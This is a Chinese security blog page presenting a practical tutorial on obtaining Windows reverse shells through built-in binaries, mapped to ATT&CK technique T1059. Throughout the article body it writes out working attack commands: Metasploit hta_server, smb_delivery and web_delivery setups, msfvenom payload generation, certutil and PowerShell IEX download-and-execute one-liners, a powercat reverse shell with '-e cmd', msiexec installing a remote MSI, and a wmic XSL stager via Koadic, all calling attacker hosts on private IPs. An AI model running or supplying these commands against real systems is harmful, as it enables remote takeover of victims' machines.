<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>windows 反弹shell_原创干货 | windows反弹shell小结 - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="windows 反弹shell_原创干货 | windows反弹shell小结" />
<meta property="og:description" content="前言 本文是att&amp;ck Command-Line Interface的展开篇
平时遇到rce的漏洞，我们通常会弹一个shell给自己，(提权，内网渗透，搭建跳板，等等)linux反弹shell得益于命令行特别友好，所以我们可以非常简单地就可以把shell弹出来，比如使用bash，perl，python，nc，获得shell的原理其实就是建立了一个socket通道，那么今天我们来看看windows如何反弹shell
目录 Mshta.exe
通过Metasploit的HTAWeb服务器发起HTA攻击
rundll32.exe
通过SMB交付Metasploit发起Rundll32攻击
Regsvr32.exe
通过Metasploit的脚本Web交付启动Regsvr32
Certutil.exe
通过MsfvenomC＃shellcode启动MSbuild攻击
Powershell.exe
通过Powershell发起Powercat攻击
通过Powershell启动cscript.exe
通过Powershell发起批处理文件攻击
Msiexec.exe
通过msfvenom发动msiexec攻击
Wmic.exe
通过Koadic发起Wmic.exe攻击
Mshta.exe Mshta.exe运行MicrosoftHTML应用程序主机，这是WindowsOS实用程序，负责运行HTA(HTML应用程序)文件。我们可以用来运行JavaScript或VBScript的HTML文件。您可以使用MicrosoftMSHTA.exe工具解释这些文件。
Metasploit包含“HTAWeb服务器”模块，该模块会生成恶意的hta文件。该模块托管一个HTML应用程序(HTA)，该应用程序在打开时将通过Powershell运行有效负载。当用户导航到HTA文件时，将在执行有效负载之前由IE两次提示它们。
use exploit/windows/misc/hta_servermsf exploit(windows/misc/hta_server) &gt; set srvhost 192.168.1.109msf exploit(windows/misc/hta_server) &gt; set lhost 192.168.1.109msf exploit(windows/misc/hta_server) &gt; exploit 现在，通过受害者计算机上的mshta.exe(容易受到RCE攻击)运行恶意代码，以获取Meterpreter会话。
rundll32.exe Rundll32.exe与Windows操作系统相关联，可让您调用从DLL(16位或32位)导出的函数并将其存储在适当的内存库中。
通过SMB交付Metasploit发起Rundll32攻击
Metasploit还包含“SMBDelivery”模块，该模块生成恶意的dll文件。该模块通过SMB服务器提供有效负载，并提供检索和执行生成的有效负载的命令。当前支持DLL和Powershell。
use exploit/windows/smb/smb_deliverymsf exploit(windows/smb/smb_delivery) &gt; set srvhost 192.168.1.109msf exploit(windows/smb/smb_delivery) &gt; exploit 现在，通过受害机器(对RCE易受攻击)上的rundll32.exe运行恶意代码，以获取Meterpreter会话。
经过测试只能支持smb1协议机器才行
Regsvr32.exe Regsvr32是一个命令行实用程序，用于注册和注销OLE控件，例如Windows注册表中的DLL和ActiveX控件。WindowsXP和更高版本的Windows的％systemroot％\System32文件夹中安装了Regsvr32.exe。
RegSvr32.exe具有以下命令行选项：
语法：Regsvr32/s/n]
/ u –注销服务器
/ i –调用DllInstall，并为其传递可选的[cmdline]；与/u一起使用时，它将调用dll来卸载
/ n –不要调用DllRegisterServer；此选项必须与/i" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/8a7d4047844738e4bfbb702cee790247/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-11-19T23:00:19+08:00" />
<meta property="article:modified_time" content="2020-11-19T23:00:19+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">windows 反弹shell_原创干货 | windows反弹shell小结</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <div class="._5ce-wx-style" style="font-size:16px;"> 
 <div class="rich_media_content" id="js_content"> 
  <p><img src="https://images2.imgbox.com/dd/94/uXEkEAtq_o.gif" alt="23d87f35947fb5ce78a9f53178a7b6ee.gif"></p> 
  <h3></h3>前言 
  <h3></h3> 
  <p>本文是att&amp;ck Command-Line Interface的展开篇</p> 
  <p>平时遇到rce的漏洞，我们通常会弹一个shell给自己，(提权，内网渗透，搭建跳板，等等)linux反弹shell得益于命令行特别友好，所以我们可以非常简单地就可以把shell弹出来，比如使用bash，perl，python，nc，获得shell的原理其实就是建立了一个socket通道，那么今天我们来看看windows如何反弹shell</p> 
  <h3></h3>目录 
  <h3></h3> 
  <ul><li><p>Mshta.exe</p><p>通过Metasploit的<strong>HTAWeb</strong>服务器发起HTA攻击</p></li><li><p>rundll32.exe</p><p>通过SMB交付Metasploit发起Rundll32攻击</p></li><li><p>Regsvr32.exe</p><p>通过Metasploit的脚本Web交付启动Regsvr32</p></li><li><p>Certutil.exe</p><p>通过MsfvenomC＃shellcode启动MSbuild攻击</p></li><li><p>Powershell.exe</p><p>通过Powershell发起Powercat攻击</p><p>通过Powershell启动cscript.exe</p><p>通过Powershell发起批处理文件攻击</p></li><li><p>Msiexec.exe</p><p>通过msfvenom发动msiexec攻击</p></li><li><p>Wmic.exe</p><p>通过Koadic发起Wmic.exe攻击</p></li></ul> 
  <h4><span style="font-weight:bold;"><strong>Mshta.exe</strong></span></h4> 
  <p>Mshta.exe运行MicrosoftHTML应用程序主机，这是WindowsOS实用程序，负责运行HTA(HTML应用程序)文件。我们可以用来运行JavaScript或VBScript的HTML文件。您可以使用MicrosoftMSHTA.exe工具解释这些文件。</p> 
  <p>Metasploit包含“HTAWeb服务器”模块，该模块会生成恶意的hta文件。该模块托管一个HTML应用程序(HTA)，该应用程序在打开时将通过Powershell运行有效负载。当用户导航到HTA文件时，将在执行有效负载之前由IE两次提示它们。</p> 
  <pre class="has"><code>use exploit/windows/misc/hta_servermsf exploit(windows/misc/hta_server) &gt; set srvhost 192.168.1.109msf exploit(windows/misc/hta_server) &gt; set lhost 192.168.1.109msf exploit(windows/misc/hta_server) &gt; exploit</code></pre> 
  <p>现在，通过受害者计算机上的mshta.exe(容易受到RCE攻击)运行恶意代码，以获取Meterpreter会话。</p> 
  <p><img src="https://images2.imgbox.com/5d/dc/UHkBUPLq_o.png" alt="f7b3422323378ef87be352ccc3e17d7c.png"></p> 
  <h4><span style="font-weight:bold;"><strong>rundll32.exe</strong></span></h4> 
  <p>Rundll32.exe与Windows操作系统相关联，可让您调用从DLL(16位或32位)导出的函数并将其存储在适当的内存库中。</p> 
  <p>通过SMB交付Metasploit发起Rundll32攻击</p> 
  <p>Metasploit还包含“SMBDelivery”模块，该模块生成恶意的dll文件。该模块通过SMB服务器提供有效负载，并提供检索和执行生成的有效负载的命令。当前支持DLL和Powershell。</p> 
  <pre class="has"><code>use exploit/windows/smb/smb_deliverymsf exploit(windows/smb/smb_delivery) &gt; set srvhost 192.168.1.109msf exploit(windows/smb/smb_delivery) &gt; exploit</code></pre> 
  <p>现在，通过受害机器(对RCE易受攻击)上的rundll32.exe运行恶意代码，以获取Meterpreter会话。</p> 
  <p><img src="https://images2.imgbox.com/f7/34/lrOf5R2R_o.png" alt="2e8cb78246859856116fb2d61a818516.png"></p> 
  <p>经过测试只能支持smb1协议机器才行</p> 
  <h4><span style="font-weight:bold;"><strong>Regsvr32.exe</strong></span></h4> 
  <p>Regsvr32是一个命令行实用程序，用于注册和注销OLE控件，例如Windows注册表中的DLL和ActiveX控件。WindowsXP和更高版本的Windows的％systemroot％\System32文件夹中安装了Regsvr32.exe。</p> 
  <p>RegSvr32.exe具有以下命令行选项：</p> 
  <p>语法：Regsvr32/s/n]</p> 
  <p>/ u –注销服务器</p> 
  <p>/ i –调用DllInstall，并为其传递可选的[cmdline]；与/u一起使用时，它将调用dll来卸载</p> 
  <p>/ n –不要调用DllRegisterServer；此选项必须与/i</p> 
  <p>/ s一起使用-静默；不显示消息框</p> 
  <p>通过Metasploit的脚本Web交付启动Regsvr32</p> 
  <p>此模块可快速启动提供有效负载的Web服务器。提供的命令将允许有效负载下载并执行。它将通过regsvr32.exe来指定脚本语言解释器或“squibledoo”来绕过应用程序白名单。该模块的主要目的是在攻击者必须手动键入命令时在目标计算机上快速建立会话：例如，命令注入。</p> 
  <p>Regsvr32使用“squablydoo”技术绕过应用程序白名单。签名的Microsoft二进制文件Regsvr32可以请求一个.sct文件，然后在其中执行包含的PowerShell命令。这两个Web请求(即.sct文件和PowerShell下载/执行)都可以在同一端口上发生。“PSH(二进制)”将文件写入磁盘，从而允许自定义二进制文件被提供以下载/执行。</p> 
  <pre class="has"><code>use exploit/multi/script/web_deliverymsf exploit (web_delivery)&gt;set target 3msf exploit (web_delivery)&gt; set payload windows/meterpreter/reverse_tcpmsf exploit (web_delivery)&gt; set lhost 192.168.1.109msf exploit (web_delivery)&gt;set srvhost 192.168.1.109msf exploit (web_delivery)&gt;exploit</code></pre> 
  <p><img src="https://images2.imgbox.com/1a/05/gaFY9OF8_o.png" alt="ef59dfd63bdf2e0e58ab9034ddff44d7.png"></p> 
  <p>一旦在regsrv32.exe的帮助下在远程计算机上执行scrobj.dll文件，您将在本地计算机(KaliLinux)上获得反向连接。</p> 
  <h4><span style="font-weight:bold;"><strong>Certutil.exe</strong></span></h4> 
  <p>Certutil.exe是作为证书服务的一部分安装的命令行程序。我们可以使用此工具在目标计算机上执行恶意exe文件，以获取抄表程序会话。</p> 
  <p>通过Msfvenom发起certutil攻击</p> 
  <p>使用msfvenom生成一个恶意可执行文件(.exe)，然后启动multi/ handler以获取受害者计算机的反向外壳。</p> 
  <p>msfvenom-p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -fexe &gt; shell.exe</p> 
  <pre class="has"><code>certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe &amp; shell.exe</code></pre> 
  <p>解释Certutil.exe可以下载文件</p> 
  <h4><span style="font-weight:bold;"><strong>Powershell.exe</strong></span></h4> 
  <p>您可以使用PowerShell.exe从另一个工具(例如Cmd.exe)的命令行启动PowerShell会话，也可以在PowerShell命令行中使用它来启动新会话。从此处阅读MicrosoftWindows官方网站上的更多信息。</p> 
  <h5><span style="font-weight:bold;"><span style="font-weight:bold;"><strong>通过</strong></span><span style="font-weight:bold;"><strong>Powershell</strong></span><span style="font-weight:bold;"><strong>发起</strong></span><span style="font-weight:bold;"><strong>Powercat</strong></span><span style="font-weight:bold;"><strong>攻击</strong></span></span></h5> 
  <p>Powercat是PowerShell的本机后门侦听器和反向外壳，也称为netcat的修改版本，因为它集成了对生成的编码有效负载的支持，msfvenom可以做到这一点，并且还具有客户端到客户端的中继，这是Powercat客户端的术语，允许连接两个单独的侦听器。</p> 
  <p>在本地计算机上下载PowerShell，然后使用pythonHTTP服务器将powercat.ps1传输文件，以获得目标的反向外壳，如下所示，并启动netcat侦听器。</p> 
  <pre class="has"><code>git clone https://github.com/besimorhino/powercat.gitpython -m SimpleHTTPServer 80</code></pre> 
  <pre class="has"><code>powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.73.1:8080/powercat.ps1');powercat -c 192.168.73.1 -p 1234 -e cmd"</code></pre> 
  <p><img src="https://images2.imgbox.com/4d/fe/VUwXgM3G_o.png" alt="7ffc74a5009b644ee54460912fa19a97.png"></p> 
  <p><img src="https://images2.imgbox.com/4d/5b/ByKvKMRI_o.png" alt="2b284a6acaa5fdc00664074e7211fbde.png"></p> 
  <h5><span style="font-weight:bold;"><strong>批处理文件</strong></span></h5> 
  <p>同样，PowerShell允许客户端执行bat文件，因此让我们使用下面给出的msfvenom生成恶意批处理文件，然后启动netcat侦听器。</p> 
  <pre class="has"><code>msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 &gt; 1.bat</code></pre> 
  <p>然后在远程端执行以下命令以获取netcat会话。</p> 
  <pre class="has"><code>powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))"</code></pre> 
  <p><img src="https://images2.imgbox.com/2d/cc/s8rf5aSG_o.png" alt="d5be26e0086cb1a3f7fb9f0bd3304f51.png"></p> 
  <p><img src="https://images2.imgbox.com/c1/24/9ZAPcNGX_o.png" alt="4fe69c1c22dbe0af62eaa5a0d1b38e86.png"></p> 
  <h5><span style="font-weight:bold;"><strong>Cscript</strong></span></h5> 
  <p>同样，PowerShell允许客户端执行cscript.exe来运行wsf，js和vbscript，因此让我们使用下面给出的msfvenom生成恶意的bat文件，并以multi/ handler作为侦听器。</p> 
  <pre class="has"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f vbs &gt; 1.vbs</code></pre> 
  <p>然后在远端执行以下命令以获取一个抄表器会话。</p> 
  <pre class="has"><code>powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""</code></pre> 
  <p><img src="https://images2.imgbox.com/6e/fd/fLqITqDR_o.png" alt="bbac804055ba53486321a0024f176e08.png"></p> 
  <h4><span style="font-weight:bold;"><strong>Msiexec.exe</strong></span></h4> 
  <p>众所周知，Windows操作系统随附WindowsInstaller引擎，MSI软件包将其用于安装应用程序。解释软件包并安装产品的可执行程序是Msiexec.exe。</p> 
  <p>通过msfvenom发动msiexec攻击</p> 
  <p>让我们使用WindowsMeterpreter有效负载生成MSI包文件(1.msi)，如下所示，并启动multi/ handler作为侦听器。</p> 
  <pre class="has"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi &gt; 1.msi</code></pre> 
  <p>开启一个web服务</p> 
  <p>一旦在msiexec的帮助下在远程计算机上执行1.msi文件，您将在本地计算机(KaliLinux)上获得反向连接。</p> 
  <pre class="has"><code>msiexec /q /i http://192.168.1.109/1.msi</code></pre> 
  <p><img src="https://images2.imgbox.com/8b/e8/d6BeFySb_o.png" alt="49e710e88238e483ba6a02f2d5bd8519.png"></p> 
  <h4><span style="font-weight:bold;"><strong>Wmic.exe</strong></span></h4> 
  <p>WMIC实用程序是一种Microsoft工具，提供了WMI命令行界面，该界面用于本地和远程计算机的各种管理功能，还用于Wmic查询，例如系统设置，停止进程并在本地或远程执行脚本。因此，它可以调用XSL脚本(可扩展样式表语言)。</p> 
  <p>通过Koadic发起Wmic.exe攻击</p> 
  <p>现在将在koadic的帮助下生成一个恶意XSL文件，koadic是一个与Metasploit和PowershellEmpire非常相似的命令和控制工具。</p> 
  <p>要了解koadic的工作原理，请从此处阅读我们的文章：https: //www.hackingarticles.in/koadic-com-command-control-framework/</p> 
  <pre class="has"><code>git clone https://github.com/zerosum0x0/koadic.git</code></pre> 
  <p>安装完成后，您可以运行./koadic文件来启动koadic，并通过运行以下命令并设置SRVHOST来启动staged/ js / wmic stager，并设置stager应该将其作为主目录。</p> 
  <pre class="has"><code>use stager/js/wmicset SRVHOST 192.168.1.107run</code></pre> 
  <p><img src="https://images2.imgbox.com/20/2a/p86rvvki_o.png" alt="b11780177bd755279328515ffe2fc171.png"></p> 
  <p>执行以下WMIC命令以从远程服务器下载并运行恶意XSL文件：</p> 
  <p>wmicos get /FORMAT:"http://192.168.1.107:9996/g8gkv.xsl"</p> 
  <p>一旦恶意XSL文件将在目标计算机上执行，您将拥有与Metasploit一样的Zombie连接。</p> 
  <p><img src="https://images2.imgbox.com/5b/a4/oC9jZ73J_o.png" alt="e24672958cbef3b04d580eea1eb3be92.png"></p>写在最后 
  <p>本篇文章也是att&amp;ck矩阵中小知识点的扩展</p>参考链接 
  <p>https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/</p> 
  <p>https://attack.mitre.org/techniques/T1059/</p> 
  <p><strong>原创文章未经授权禁止转载，谢谢合作</strong></p> 
  <img border="0" src="https://images2.imgbox.com/38/38/awOHEvbG_o.gif" alt="fb94f2d7f6fe5b6cefe69ee77350e179.gif"> 
  <p>● 云众可信征稿进行时</p> 
  <p>● 原创干货 | 记一次拟真环境的模拟渗透测试</p> 
  <p>● 原创干货 | 从手工去除花指令到Get Key</p> 
  <p>● 原创干货 | 浅谈被动探测思路</p> 
  <p><strong>·END·</strong></p> 
  <strong>云众可信</strong> 
  <p>原创·干货·一起玩</p> 
  <p><img src="https://images2.imgbox.com/4c/ba/DUFwpqSp_o.png" alt="1fe6ab28b816630c070b1e8cfb674710.png"></p> 
  微信号：yunzhongkexin好看的人才能点 
  <img src="https://images2.imgbox.com/17/0e/Oka7YYJQ_o.gif" alt="cb9c63e819dd5eebe359bee457623f0e.gif"> 
 </div> 
</div>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/8c96f6823d950cf55e48ab921e8e2ce7/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">opencv 使用java  mat 转 base64 两种方式</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/178eaefd5805cd3ea3974680867208e4/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">smartpdf双击无法返回latex如何解决</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>